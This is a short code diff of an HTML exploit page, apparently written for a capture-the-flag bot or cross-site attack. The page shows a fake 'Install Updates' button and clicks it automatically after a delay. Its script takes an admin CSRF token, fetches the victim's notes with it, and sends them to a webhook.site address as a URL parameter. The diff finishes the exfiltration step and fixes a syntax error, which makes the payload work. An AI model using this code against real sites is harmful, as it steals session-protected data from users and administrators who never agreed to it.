@@ -5,7 +5,6 @@
   <button id="installbutton">Install Updates</button>
 
   <script>
-    // This will execute in the context of the target site when the bot visits
     document.getElementById('installbutton').addEventListener('click', async () => {
       try {
         // 1. Get admin CSRF token
@@ -19,15 +18,15 @@
           headers: { 'X-CSRF-Token': token }
         }).then(r => r.text());
         
-        // 3. Exfiltrate data (using an open redirect on the target site)
-        window.location = `https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20`;
+        // 3. Exfiltrate data
+        window.location = `https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20?data=${encodeURIComponent(notes)}`;
         
-      } catch (error) {x
+      } catch (error) {
         // Fallback if something fails
         window.location = 'https://google.com';
       }
     });
-    
+
     // Auto-click after delay
     setTimeout(() => {
       document.getElementById('installbutton').click();
